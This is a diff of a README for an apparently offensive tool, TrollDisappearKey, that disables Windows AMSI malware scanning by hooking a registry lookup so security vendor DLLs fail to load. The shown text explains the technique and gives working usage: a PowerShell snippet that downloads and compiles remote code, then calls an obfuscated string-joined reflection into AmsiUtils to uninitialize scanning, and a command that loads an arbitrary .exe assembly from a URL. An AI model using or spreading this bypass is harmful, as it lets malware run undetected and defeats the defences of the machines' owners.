@@ -9,12 +9,21 @@
 # TrollDisappearKey
 TrollDisappearKey.cs   -> compile into a .exe that can load .exe assemblies without amsi scanning taking place during assembly.load() \
 TrollDisappearKeyPS.cs -> compile into a .dll to reflectively load to bypass powershell amsi \
-TrollDisappearKeyPS.ps1 -> copy paste into powershell 
+TrollDisappearKeyPS.ps1 -> copy paste into powershell (likely to get flagged) 
 
 # How does it work?
 Upon assembly.load(), internals of amsi/clr will search for reg key "Software\Microsoft\AMSI\Providers" to load the relevant provider dlls (i.e security vendor dlls) 
 We hook the reg query function and when amsi/clr tries to read "Software\Microsoft\AMSI\Providers" we overwrite its value to "Software\Microsoft\AMSI\Providers "  <- note the space after providers
 This breaks the provider dlls loading process and we are able to assembly load any .net assembly we want. For the powershell amsi, its somewhat similar, we break the vendor dll loading and call uninitialize to trigger a reinitialize. 
+
+
+## .exe Usage (does not require admin) 
+![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)
+![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)
+
+```
+TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
+```
 
 ## .powershell Usage (does not require admin)
 
@@ -27,14 +36,6 @@ $code = (iwr https://raw.githubusercontent.com/cybersectroll/TrollDisappearKey/r
 Add-Type $code
 [TrollDisappearKeyPS]::DisappearKey()
 ([Ref].Assembly.GetType([System.String]::Join("", "S", "y", "s", "t", "e", "m", ".", "M", "a", "n", "a", "g", "e", "m", "e", "n", "t", ".", "A", "u", "t", "o", "m", "a", "t", "i", "o", "n", ".", "A", "m", "s", "i", "U", "t", "i", "l", "s")).GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize).Invoke($object,$null)
-```
-  
-## .exe Usage (does not require admin) 
-![Image](https://github.com/user-attachments/assets/f1678081-5fa8-4f4d-b7d3-ae9bd2e02a9f)
-![Image](https://github.com/user-attachments/assets/7ef91a6a-957f-4c91-80a2-c0b54409917c)
-
-```
-TrollDisappearKey.exe <URL TO .EXE ASSEMBLY> <ARGUMENT1,ARGUMENT2>
 ```
 
 ## Example
